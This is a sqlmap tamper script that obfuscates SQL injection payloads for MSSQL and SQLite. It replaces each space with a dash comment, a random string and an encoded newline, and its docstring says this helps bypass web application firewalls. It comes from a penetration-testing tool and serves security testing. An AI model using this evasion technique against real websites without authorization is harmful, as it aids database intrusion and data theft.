#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import string

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    "\n    Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')\n\n    Requirement:\n        * MSSQL\n        * SQLite\n\n    Notes:\n        * 可用于绕过多个 Web 应用程序防火墙\n        * 在 ZeroNights SQL 注入挑战期间使用，\n          https://proton.onsec.ru/contest/\n\n    >>> random.seed(0)\n    >>> tamper('1 AND 9227=9227')\n    '1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227'\n    "

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                retVal += "--%s%%0A" % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal
